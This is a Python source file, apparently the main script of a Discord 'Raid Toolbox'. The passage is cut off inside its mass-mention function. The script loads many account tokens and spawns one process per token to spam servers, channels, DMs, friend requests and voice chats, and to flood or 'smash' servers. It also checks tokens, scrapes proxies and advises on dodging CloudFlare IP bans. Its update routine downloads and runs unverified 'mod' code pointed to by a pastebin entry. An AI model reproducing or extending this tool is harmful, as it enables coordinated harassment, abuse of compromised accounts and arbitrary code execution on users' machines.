#!/usr/bin/env python3
# Raid Toolbox
# Author: DeadBread76 - https://github.com/DeadBread76/
# Febuary 23rd, 2019

rtbversion = "0.3.7r7"
smversion = "0.1.7"

try:
    from config import*
except Exception:
    print("Unable to import config file.\nImporting necessary modules and checking installation...")
    import os
    import sys
    import urllib.request
    import subprocess
    if not os.path.exists("spammer/"):
        print("Spammer Directory not found.")
    if not os.path.exists("tools/"):
        print("Tools Directory not found.")
    response = urllib.request.urlopen('https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/config.py')
    data = response.read()
    data = data.decode('utf-8')
    with open("config.py","w+") as handle:
        handle.write(data)
    response = urllib.request.urlopen('https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/requirements.txt')
    data = response.read()
    data = data.decode('utf-8')
    with open("requirements.txt","w+") as handle:
        handle.write(data)
    try:
        from config import*
    except Exception:
        print("Unable to start.")
        input()
        sys.exit()
    if sys.platform.startswith('win32'):
        installation = subprocess.Popen([winpip,'install','-r','requirements.txt','--user'])
    elif sys.platform.startswith('linux'):
        installation = subprocess.Popen([linuxpip,'install','-r','requirements.txt'])
    installation.wait()

if verbose == 1:
    try:
        with open ("load.log", "w+") as handle:
            print ("Loading system modules...")
            import os
            print ("Loaded os")
            handle.write("Loaded os\n")
            import sys
            print ("Loaded sys")
            handle.write("Loaded sys\n")
            import time
            print ("Loaded time")
            handle.write("Loaded time\n")
            import json
            print ("Loaded json")
            handle.write("Loaded json\n")
            import ctypes
            print ("Loaded ctypes")
            handle.write("Loaded ctypes\n")
            if sys.platform.startswith('win32'):
                ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox is loading... | Verbose Mode")
                handle.write("Set Title, Windows, ctypes\n")
            elif sys.platform.startswith('linux'):
                sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox is loading... | Verbose Mode\x07")
                handle.write("Set Title, Linux, sys\n")
            import random
            print ("Loaded random")
            handle.write("Loaded random\n")
            import datetime
            print ("Loaded datetime")
            handle.write("Loaded datetime\n")
            import platform
            print ("Loaded platform")
            handle.write("Loaded platform\n")
            import shutil
            print ("Loaded shutil")
            handle.write("Loaded shutil\n")
            import subprocess
            print ("Loaded subprocess")
            handle.write("Loaded subprocess\n")
            import signal
            print ("Loaded signal")
            handle.write("Loaded signal\n")
            from distutils.dir_util import copy_tree
            print ("Loaded copy_tree")
            handle.write("Loaded copy_tree\n")
            if sys.platform.startswith('win32'):
                from subprocess import CREATE_NEW_CONSOLE
                print ("Loaded CREATE_NEW_CONSOLE")
                handle.write("Loaded CREATE_NEW_CONSOLE\n")
            from tkinter import *
            print ("Loaded tkinter")
            handle.write("Loaded tkinter\n")
            from tkinter.filedialog import *
            print ("Loaded tkinter.filedialog")
            handle.write("Loaded tkinter.filedialog\n")
    except Exception as i:
        print ("Error loading system module, Exception: "+str(i))
        with open ("load.log", "a") as handle:
            handle.write(str(i)+"\n")
    with open ("load.log", "a") as handle:
        try:
            print ("Loading discord.py...")
            import discord
            print ("Loaded discord.py")
            handle.write("Loaded discord.py\n")
        except Exception as i:
            print ("Error Loading discord.py")
            handle.write("Error Loading discord.py\n")
        try:
            print ("Loading requests...")
            import requests
            print ("Loaded requests")
            handle.write("Loaded requests\n")
        except Exception as i:
            print ("Error Loading requests")
            handle.write("Error Loading requests\n")
        try:
            print ("Loading youtube-dl...")
            import youtube_dl
            print ("Loaded youtube-dl")
            handle.write("Loaded youtube-dl\n")
        except Exception as i:
            print ("Error Loading youtube-dl")
            handle.write("Error Loading youtube-dl\n")
        try:
            print ("Loading colorama...")
            from colorama import init
            print ("Loaded colorama")
            handle.write("Loaded colorama\n")
        except Exception as i:
            print ("Error Loading colorama")
            handle.write("Error Loading colorama\n")
        try:
            print ("Loading termcolor...")
            from termcolor import colored
            print ("Loaded termcolor")
            handle.write("Loaded termcolor\n")
        except Exception as i:
            print ("Error Loading termcolor")
            handle.write("Error Loading termcolor\n")
        try:
            print ("Loading proxyscrape...")
            from proxyscrape import create_collector
            print ("Loaded proxyscrape")
            handle.write("Loaded proxyscrape\n")
        except Exception as i:
            print ("Error Loading proxyscrape")
            handle.write("Error Loading proxyscrape\n")
        try:
            print ("Loading animation...")
            import animation
            print ("Loaded animation")
            handle.write("Loaded animation\n")
        except Exception as i:
            print ("Error Loading animation")
            handle.write("Error Loading animation\n")
    print ("Loaded all modules")

else:
    try:
        import os
        import sys
        import time
        import json
        import ctypes
        if sys.platform.startswith('win32'):
            ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox is loading...")
        elif sys.platform.startswith('linux'):
            sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox is loading...\x07")
        else:
            print ("Unsupported OS.")
            input()
            sys.exit()
        import random
        import datetime
        import platform
        import shutil
        import subprocess
        import signal
        import discord
        import requests
        import youtube_dl
        import animation
        from colorama import init
        from termcolor import colored
        from proxyscrape import create_collector
        from distutils.dir_util import copy_tree
        if sys.platform.startswith('win32'):
            from subprocess import CREATE_NEW_CONSOLE
        from tkinter import *
        from tkinter.filedialog import *
    except Exception as i:
        print ("Module error: " + str(i))
        print ("Please check that the module is installed.")
        install = input ("Would you like Raid ToolBox to try and install it for you?(Y/N)")
        if install.lower() == 'y':
            if sys.platform.startswith('win32'):
                installation = subprocess.Popen([winpip,'install','-r','requirements.txt','--user'])
            elif sys.platform.startswith('linux'):
                installation = subprocess.Popen([linuxpip,'install','-r','requirements.txt'])
            installation.wait()
            print("Please Restart Raid Toolbox.")
            input()
            sys.exit()
        else:
            sys.exit()

ydl_opts = {
    'outtmpl': 'spammer/file.webm',
    'format': 'bestaudio/best',
    'postprocessors': [{
        'key': 'FFmpegExtractAudio',
        'preferredcodec': 'wav',
        'preferredquality': '192',
    }],
}

init()
collector = create_collector('my-collector', 'https')
colours = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
if menucolour.lower() == 'random':
    menucolour = random.choice(colours)
if menucolour2.lower() == 'random':
    menucolour2 = random.choice(colours)
if sys.platform.startswith('win32'):
    clear = lambda: os.system('cls')
elif sys.platform.startswith('linux'):
    clear = lambda: os.system('clear')

if disableupdatecheck == 1:
    pass
else:
    try:
        if verbose == 1:
            print("Checking for updates...")
        vercheck = requests.get("https://pastebin.com/raw/Fn4s3yr2").text.rstrip().split("|")
        if not vercheck[0] == rtbversion:
            print(colored("There is an update for RTB, Download update?", menucolour))
            verchoice = input("(Y/N): ")
            if verchoice.lower() == "y":
                clear()
                @animation.wait(colored('Downloading update for Raid ToolBox, Please Wait ',menucolour))
                def run_update():
                    if sys.platform.startswith('win32'):
                        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Updating...")
                    elif sys.platform.startswith('linux'):
                        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Updating...\x07")
                    update = requests.get('https://github.com/DeadBread76/Raid-Toolbox/archive/master.zip')
                    clear()
                    print(colored("Update has been downloaded, Installing...",menucolour))
                    return update
                update = run_update()
                with open("update.zip", "wb") as handle:
                    handle.write(update.content)
                try:
                    shutil.copy("config.py", "config_old.py")
                    shutil.copy("spammer/smconfig.py", "spammer/smconfig_old.py")
                except Exception:
                    pass
                try:
                    shutil.unpack_archive("update.zip")
                    copy_tree("Raid-Toolbox-master/", ".")
                    os.remove("update.zip")
                    shutil.rmtree("Raid-Toolbox-master/")
                    print ("Update complete, exiting.")
                except Exception as e:
                    print("Error Updating, {}".format(e))
                time.sleep(3)
                sys.exit()
        if not vercheck[1] == smversion:
            print(colored("There is an update for Server Smasher, Download update?", menucolour))
            verchoice = input("(Y/N): ")
            if verchoice.lower() == "y":
                clear()
                print(colored('Downloading update for Server Smasher, Please Wait...',menucolour))
                serversmasherupdate = requests.get('https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/spammer/serversmasher.py')
                configupdate =  requests.get('https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/spammer/smconfig.py')
                mainpatch = requests.get("https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/main.py")
                print(colored("Update has been downloaded, Installing...",menucolour))
                try:
                    shutil.copy("spammer/smconfig.py", "spammer/smconfig_old.py")
                except Exception:
                    pass
                with open("spammer/serversmasher.py", "wb") as handle:
                    handle.write(serversmasherupdate.content)
                with open("spammer/smconfig.py", "wb") as handle:
                    handle.write(configupdate.content)
                with open("main.py", "wb") as handle:
                    handle.write(mainpatch.content)
                print(colored("Update Complete.",menucolour))
                input("Press enter to exit.")
                sys.exit()
        if len(vercheck) > 2:
            if os.path.exists("mods/"+vercheck[3]):
                pass
            else:
                print("Found Modification For RTB, Downloading...")
                data = requests.get(vercheck[2])
                if not os.path.exists("mods/"):
                    os.mkdir("mods/")
                with open ("mods/"+vercheck[3],"wb") as handle:
                    handle.write(data.content)
                if sys.platform.startswith('win32'):
                    subprocess.Popen([winpy,"mods/"+vercheck[3]])
                elif sys.platform.startswith('linux'):
                    subprocess.Popen([linuxpy,"mods/"+vercheck[3]])
    except Exception as e:
        print("Error Updating")

if os.path.isfile("pluginpids"):
    os.remove("pluginpids")
    if verbose == 1:
        print("Removed pluginpids")
if os.path.exists('tokens.txt'):
    with open('tokens.txt','r') as handle:
        line = handle.readlines()
        tcounter = len(line)
        if verbose == 1:
            print("Loaded {} Tokens".format(tcounter))
else:
    with open('tokens.txt','w+') as handle:
        if verbose == 1:
            print ("Created Tokens.txt")
if not os.path.exists("spammer"):
    clear()
    singlefile = True
    print("RTB is Running in Single File mode.\nPlease use the update function to download the complete program.")
    input(colored("Press enter to continue.",menucolour))
else:
    singlefile = False
    if sys.platform.startswith('win32'):
        if ignoreffmpegmissing == 0:
            if not os.path.isfile("ffmpeg.exe"):
                if verbose == 1:
                    print("FFmpeg is missing")
                print(colored("Download FFMpeg? (Needed For Voice Chat Spammer)", menucolour))
                fmpg = input("(Y/N):")
                if fmpg.lower() == "y":
                    clear()
                    @animation.wait(colored('Downloading FFMpeg, Please Wait ',menucolour))
                    def ffmpegdownload():
                        data = requests.get("https://ffmpeg.zeranoe.com/builds/win64/static/ffmpeg-4.1.3-win64-static.zip")
                        return data
                    data = ffmpegdownload()
                    print(colored("Download Complete.","green"))
                    with open("ffmpeg.zip", "wb") as handle:
                        handle.write(data.content)
                    shutil.unpack_archive("ffmpeg.zip")
                    time.sleep(0.5)
                    os.remove("ffmpeg.zip")
                    copy_tree("ffmpeg-4.1.3-win64-static/bin/", ".")
                    time.sleep(0.5)
                    shutil.rmtree("ffmpeg-4.1.3-win64-static")
if disablecloudflarecheck == 1:
    pass
else:
    if verbose == 1:
        print("Checking CloudFlare Status")
    cloudflarecheck = requests.get("https://discordapp.com/api/v6/invite/DEADBREAD")
    try:
        json.loads(cloudflarecheck.content)
    except Exception:
        print("Your IP is CloudFlare Banned.\nThis means you can't use the Joiner or the Regular Checker.\nUse Proxies or a VPN to get around this.")
        input(colored("Press enter to continue.",'red'))
if verbose == 1:
    print("Starting...")
try:
    if tcounter > tokenwarningthreshhold and tcounter < 1000:
        if disabletokenlimit == 1:
            pass
        else:
            print(colored("Using This many tokens may make your PC slow down or freeze, depending on how good your PC is.\nIf you have issues, try removing some.","blue"))
            input()
    if tcounter > 1000:
        if disabletokenlimit == 1:
            pass
        else:
            print (colored("Using this many tokens may cause your PC to freeze or crash. \nType 'continue' to continue anyway despite the warning, or Raid ToolBox will exit.","red"))
            lem = input ()
            if lem == 'continue':
                clear()
            else:
                sys.exit()
except Exception:
    pass
currentattacks = []
spawnedpids = []
def main(currentattacks,spawnedpids):
    if sys.platform.startswith('win32'):
        os.system('mode con:cols=100 lines=30')
    elif sys.platform.startswith('linux'):
        os.system("printf '\033[8;30;100t'")
    with open('tokens.txt','r') as handle:
        line = handle.readlines()
        tcounter = len(line)
    now = datetime.datetime.now()
    clear()
    if useproxies == 'True':
        if sys.platform.startswith('win32'):
            ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Proxies Enabled")
        elif sys.platform.startswith('linux'):
            sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Proxies Enabled\x07")
    else:
        if sys.platform.startswith('win32'):
            ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox v{}".format(rtbversion))
        elif sys.platform.startswith('linux'):
            sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox vL{}\x07".format(rtbversion))
    if len(str(tcounter)) == 1:
        menublank = "    "
    if len(str(tcounter)) == 2:
        menublank = "   "
    if len(str(tcounter)) == 3:
        menublank = "  "
    if len(str(tcounter)) == 4:
        menublank = " "
    if alternatemenu == True:
            print (colored("                                                                                       ",menucolour))
            if singlefile == True:
                print (colored("                                SINGLE FILE MODE IS ACTIVE                                   ",menucolour))
            print (colored("                                   .s5SSSs.  .s5SSSSs. .s5SSSs.  ",menucolour))
            print (colored("                                         SS.    SSS          SS. ",menucolour))
            print (colored("                                   sS    S%S    S%S    sS    S%S ",menucolour))
            print (colored("                                   SS    S%S    S%S    SS    S%S ",menucolour))
            print (colored("                                   SS .sS;:'    S%S    SS .sSSS  ",menucolour))
            print (colored("                                   SS    ;,     S%S    SS    S%S ",menucolour))
            print (colored("                                   SS    `:;    `:;    SS    `:; ",menucolour))
            print (colored("                                   SS    ;,.    ;,.    SS    ;,. ",menucolour))
            print (colored("                                   `:    ;:'    ;:'    `:;;;;;:'",menucolour))
            print (colored("                                   _____________________________",menucolour))
            print (colored("                                   Raid ToolBox version "+rtbversion,menucolour))
            if tcounter == 0:
                print (colored("                               Tokens : No tokens available."+menublank+now+" ",menucolour))
            elif tcounter == 1:
                print (colored("                               Tokens : There is "+str(tcounter)+" token available. "+menublank+" ",menucolour))
            else:
                print (colored("                               Tokens : There are "+str(tcounter)+" tokens available. "+menublank+" ",menucolour))
            print (colored("                                                                                       ",menucolour))
            print (colored("           [0].  Exit                                [13]. Playing game changer              ",menucolour))
            print (colored("           [1].  Joiner                              [14]. Ascii Nickname (Spams Audit log)  ",menucolour))
            print (colored("           [2].  Leaver                              [15]. Embed Spammer                     ",menucolour))
            print (colored("           [3].  Group DM leaver                     [16]. TrafficLight status effect        ",menucolour))
            print (colored("           [4].  Token Checker                       [17]. Role Mass Mentioner               ",menucolour))
            print (colored("           [5].  Message spammer                     [18]. Channel Message Cleaner           ",menucolour))
            print (colored("           [6].  Ascii spammer                       [19]. Server Smasher (Single bot token) ",menucolour))
            print (colored("           [7].  Mass mention spammer                [20]. Proxy Scraper                     ",menucolour))
            print (colored("           [8].  Voice Chat Spammer                  [21]. Voice chat join spammer           ",menucolour))
            print (colored("           [9].  User DM Spammer                     [22]. View Running Attacks              ",menucolour))
            print (colored("           [10]. Friend Request Spammer              [23]. Custom attack plugins             ",menucolour))
            print (colored("           [11]. Group DM spammer                    [24]. More Options                      ",menucolour))
            print (colored("           [12]. Image Spammer                                                           ",menucolour))
            print (colored(" ",menucolour))
            choice = input(colored("    Menu => ",menucolour))
    else:
        print (colored("████████████████████████████████████████████████████████████████████████████████████████████████████",menucolour))
        print (colored("██                                                                                                ██",menucolour))
        if singlefile == True:
            print (colored("██                                   ",menucolour)+(colored("SINGLE FILE MODE IS ACTIVE",menucolour2)+(colored("                                   ██",menucolour))))
        else:
            print (colored("██                               ",menucolour)+colored("Welcome to DeadBread's Raid Toolbox",menucolour2)+colored("                              ██",menucolour))
        print (colored("██                                                                                                ██",menucolour))
        print (colored("████████████████████████████████████████████████████████████████████████████████████████████████████",menucolour))
        print (colored("██                                                                                                ██",menucolour))
        if tcounter == 0:
            print (colored("██                                      ",menucolour)+(colored("No tokens available.",menucolour2)+(colored("              "+colored(menublank+now.strftime("%d/%m/%Y %H:%M:%S"),menucolour2)+(colored(" ██",menucolour))))))
        elif tcounter == 1:
            print (colored("██                                  ",menucolour)+(colored("There is "+str(tcounter),menucolour2)+(colored(" token available.           ",menucolour2)+(colored(menublank+now.strftime("%d/%m/%Y %H:%M:%S"),menucolour2)+(colored(" ██",menucolour))))))
        else:
            print (colored("██                                  ",menucolour)+(colored("There are "+str(tcounter),menucolour2)+(colored(" tokens available.         ",menucolour2)+(colored(menublank+now.strftime("%d/%m/%Y %H:%M:%S"),menucolour2)+(colored(" ██",menucolour))))))
        print (colored("██                                                                                                ██",menucolour))
        print (colored("████████████████████████████████████████████████████████████████████████████████████████████████████",menucolour))
        print (colored("██                                               ██                                               ██",menucolour))
        print (colored("██         ",menucolour)+(colored("0.  Exit",menucolour2)+colored("                              ██",menucolour)+colored("         13. Playing game changer",menucolour2)+colored("              ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("1.  Joiner",menucolour2)+colored("                            ██",menucolour)+colored("         14. Ascii Nickname (Spams Audit log)",menucolour2)+colored("  ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("2.  Leaver",menucolour2)+colored("                            ██",menucolour)+colored("         15. Embed Spammer",menucolour2)+colored("                     ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("3.  Group DM leaver",menucolour2)+colored("                   ██",menucolour)+colored("         16. TrafficLight status effect",menucolour2)+colored("        ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("4.  Token Checker",menucolour2)+colored("                     ██",menucolour)+colored("         17. Role Mass Mentioner",menucolour2)+colored("               ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("5.  Message spammer",menucolour2)+colored("                   ██",menucolour)+colored("         18. Channel Message Cleaner",menucolour2)+colored("           ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("6.  Ascii spammer",menucolour2)+colored("                     ██",menucolour)+colored("         19. Server Smasher (Single bot token)",menucolour2)+colored(" ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("7.  Mass mention spammer",menucolour2)+colored("              ██",menucolour)+colored("         20. Proxy Scraper",menucolour2)+colored("                     ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("8.  Voice Chat Spammer",menucolour2)+colored("                ██",menucolour)+colored("         21. Voice chat join spammer",menucolour2)+colored("           ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("9.  User DM Spammer",menucolour2)+colored("                   ██",menucolour)+colored("         22. View Running Attacks",menucolour2)+colored("              ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("10. Friend Request Spammer",menucolour2)+colored("            ██",menucolour)+colored("         23. Custom attack plugins",menucolour2)+colored("             ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("11. Group DM spammer",menucolour2)+colored("                  ██",menucolour)+colored("         24. More Options",menucolour2)+colored("                      ██",menucolour)))
        print (colored("██         ",menucolour)+(colored("12. Image Spammer",menucolour2)+colored("                     ██",menucolour)+colored("                                               ██",menucolour)))
        print (colored("██                                               ██                                               ██",menucolour))
        print (colored("████████████████████████████████████████████████████████████████████████████████████████████████████",menucolour))
        print (colored("██                                               ██                                               ██",menucolour))
        print (colored("██     ",menucolour)+(colored("Please enter the number of your choice.",menucolour2)+colored("   ██    ",menucolour)+(colored("Type 'info' for Information and Updates",menucolour2)+colored("    ██",menucolour))))
        print (colored("██                                               ██                                               ██",menucolour))
        print (colored("████████████████████████████████████████████████████████████████████████████████████████████████████",menucolour))
        choice = input(colored(">",menucolour2))
    try:
        if choice.lower() == 'info':
            info(currentattacks,spawnedpids)
        if int(choice) == 0:
            for pid in spawnedpids:
                if sys.platform.startswith('win32'):
                    try:
                        os.kill(int(pid), 9)
                    except Exception:
                        pass
                elif sys.platform.startswith('linux'):
                    try:
                        os.kill(int(pid), signal.SIGKILL)
                    except Exception:
                        pass
            sys.exit()
        elif int(choice) == 1:
            joiner(currentattacks,spawnedpids)
        elif int(choice) == 2:
            leaver(currentattacks,spawnedpids)
        elif int(choice) == 3:
            groupleaver(currentattacks,spawnedpids)
        elif int(choice) == 4:
            tokencheck(currentattacks,spawnedpids)
        elif int(choice) == 5:
            messagespam(currentattacks,spawnedpids)
        elif int(choice) == 6:
            asciispam(currentattacks,spawnedpids)
        elif int(choice) == 7:
            massmentioner(currentattacks,spawnedpids)
        elif int(choice) == 8:
            vcspam(currentattacks,spawnedpids)
        elif int(choice) == 9:
            dmspam(currentattacks,spawnedpids)
        elif int(choice) == 10:
            friender(currentattacks,spawnedpids)
        elif int(choice) == 11:
            groupdmspam(currentattacks,spawnedpids)
        elif int(choice) == 12:
            imagespam(currentattacks,spawnedpids)
        elif int(choice) == 13:
            gamechange(currentattacks,spawnedpids)
        elif int(choice) == 14:
            asciinick(currentattacks,spawnedpids)
        elif int(choice) == 15:
            embedspam(currentattacks,spawnedpids)
        elif int(choice) == 16:
            trafficlight(currentattacks,spawnedpids)
        elif int(choice) == 17:
            rolemassmention(currentattacks,spawnedpids)
        elif int(choice) == 18:
            cleanup(currentattacks,spawnedpids)
        elif int(choice) == 19:
            serversmasher(currentattacks,spawnedpids)
        elif int(choice) == 20:
            proxyscrape(currentattacks,spawnedpids)
        elif int(choice) == 21:
            vcjoinspammer(currentattacks,spawnedpids)
        elif int(choice) == 22:
            viewcurrentat(currentattacks,spawnedpids)
        elif int(choice) == 23:
            customplugins(currentattacks,spawnedpids)
        elif int(choice) == 24:
            tools(currentattacks,spawnedpids)
        elif int(choice) == 986:
            wew(currentattacks,spawnedpids)
        elif int(choice) == 666:
            aaa()
        elif int(choice) == 69:
            clear()
            colours = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
            txt = "Funny guy over here"
            a = ''
            for x in txt:
                a += colored(x,random.choice(colours)) + " "
            print(a)
            input()
            main(currentattacks,spawnedpids)
        else:
            clear()
            print (colored('Invalid Option.',"yellow"))
            input()
            main(currentattacks,spawnedpids)
    except Exception as i:
        clear()
        if 'invalid literal for int()' in str(i):
            print (colored('Invalid Option.',"yellow"))
        else:
            print (colored(i,"yellow"))
        input()
        main(currentattacks,spawnedpids)

def joiner(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Invite Joiner")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Invite Joiner\x07")
    print (colored("Discord invite joiner.",menucolour))
    print (colored("0: Back",menucolour))
    link = input('Discord Invite Link: ')
    if link == '0':
        main(currentattacks,spawnedpids)
    if len(link) > 7:
        link = link[19:]
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/joiner.py',token,link,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/joiner.py',token,link,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
    time.sleep(3)
    main(currentattacks,spawnedpids)

def leaver(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Server Leaver")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Server Leaver\x07")
    print (colored("Discord server leaver.",menucolour))
    print (colored("0: Back",menucolour))
    ID = input ('ID of the server to leave: ')
    if str(ID) == '0':
        main(currentattacks,spawnedpids)
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/leaver.py',token,ID,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/leaver.py',token,ID,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
    time.sleep(3)
    main(currentattacks,spawnedpids)

def groupleaver(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Group DM Leaver")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Group DM Leaver\x07")
    print (colored("Discord group DM leaver.",menucolour))
    print (colored("0: Back",menucolour))
    ID = input ('ID of the group DM to leave: ')
    if str(ID) == '0':
        main(currentattacks,spawnedpids)
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/groupleaver.py',token,ID,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/groupleaver.py',token,ID,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
    time.sleep(3)
    main(currentattacks,spawnedpids)

def tokencheck(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Token Checker")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Token Checker\x07")
    vcounter = 0
    ucounter = 0
    icounter = 0
    validtokens = []
    unverified = []
    with open('tokens.txt','r') as handle:
        tokens = handle.readlines()
        if len(tokens) > 50:
            print("I'd Recommend using the quick checker for {} tokens.".format(len(tokens)))
            tok = input("Press enter to continue anyway, or type 0 to return to menu.\n")
            if tok == '0':
                main(currentattacks, spawnedpids)
        print (colored("Checking tokens...",menucolour))
        for x in tokens:
            token = x.rstrip()
            headers={
                'Authorization': token
                }
            src = requests.post('https://discordapp.com/api/v6/invite/RTBCHECKER', headers=headers)
            try:
                if "You need to verify your account in order to perform this action." in str(src.content):
                    print (colored(token + ' Unverified.',"yellow"))
                    ucounter +=1
                    if combineuverifiedandverified == 1:
                        if token in validtokens:
                            continue
                        validtokens.append(token)
                    else:
                        unverified.append(token)
                elif "401: Unauthorized" in str(src.content):
                    print (colored(token + ' Invalid.',"red"))
                    icounter +=1
                else:
                    print (colored(token + ' Verified.',"green"))
                    vcounter +=1
                    if token in validtokens:
                        continue
                    validtokens.append(token)
            except Exception as exc:
                print (exc)
        with open('tokens.txt','w') as handle:
            for token in validtokens:
                handle.write(token+'\n')
        if combineuverifiedandverified == 1:
            pass
        else:
            with open('unverified_tokens.txt','a') as handle:
                for token in unverified:
                    handle.write(token+'\n')
        print ("---------------------------------------")
        print (colored("Number of valid tokens: " + str(vcounter),"green"))
        print (colored("Number of unverified tokens: " + str(ucounter),"yellow"))
        print (colored("Number of invalid tokens: " + str(icounter),"red"))
        print ("---------------------------------------")
        input("Press enter to return to menu.")
        main(currentattacks,spawnedpids)

def messagespam(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Message Spammer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Message Spammer\x07")
    print (colored("Discord Server message spammer.",menucolour))
    print (colored("0: Back",menucolour))
    SERVER = input ("Server ID: ")
    if str(SERVER) == '0':
        main(currentattacks,spawnedpids)
    chan = input ("Channel to spam in (type 'all' for all channels): ")
    if chan.lower() == "all":
        print (colored("Spamming all channels","blue"))
        allchan = 'true'
    else:
        allchan = 'false'
    msgtxt = input ("Text to spam: ")
    tcounter = 0
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/messagespam.py',token,SERVER,number,msgtxt,chan,allchan,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/messagespam.py',token,SERVER,number,msgtxt,chan,allchan,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
        time.sleep(0.1)
    currentattacks.append("Message Spam with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def asciispam(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Ascii Spammer")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Ascii Spammer\x07")
    print (colored("Discord server ascii spammer.",menucolour))
    print (colored("0: Back",menucolour))
    SERVER = input('Server ID: ')
    if str(SERVER) == '0':
        main(currentattacks,spawnedpids)
    chan = input ("Channel to spam in (type 'all' for all channels): ")
    if chan.lower() == "all":
        print (colored("Spamming all channels","blue"))
        allchan = 'true'
    else:
        allchan = 'false'
    tcounter = 0
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
        tcounter += 1
        number = str(tcounter)
        if sys.platform.startswith('win32'):
            p = subprocess.Popen([winpy,'spammer/asciispam.py',token,number,chan,allchan,SERVER,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        elif sys.platform.startswith('linux'):
            p = subprocess.Popen([linuxpy,'spammer/asciispam.py',token,number,chan,allchan,SERVER,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        spawnedpids.append(p.pid)
        time.sleep(0.1)
    currentattacks.append("Ascii Spam with "+ str(tcounter) + " tokens.")
    time.sleep(5)
    main(currentattacks,spawnedpids)

def massmentioner(currentattacks,spawnedpids):
    clear()
    if sys.platform.startswith('win32'):
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Mass Mentioner")
    elif sys.platform.startswith('linux'):
        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Mass Mentioner\x07")
    print (colored("Discord server mass mentioner.",menucolour))
    print (colored("0: Back",menucolour))
    SERVER = input('Server ID: ')
    if str(SERVER) == '0':
        main(currentattacks,spawnedpids)
    tcounter = 0
    tokenlist = open("tokens.txt").read().splitlines()
    for token in tokenlist:
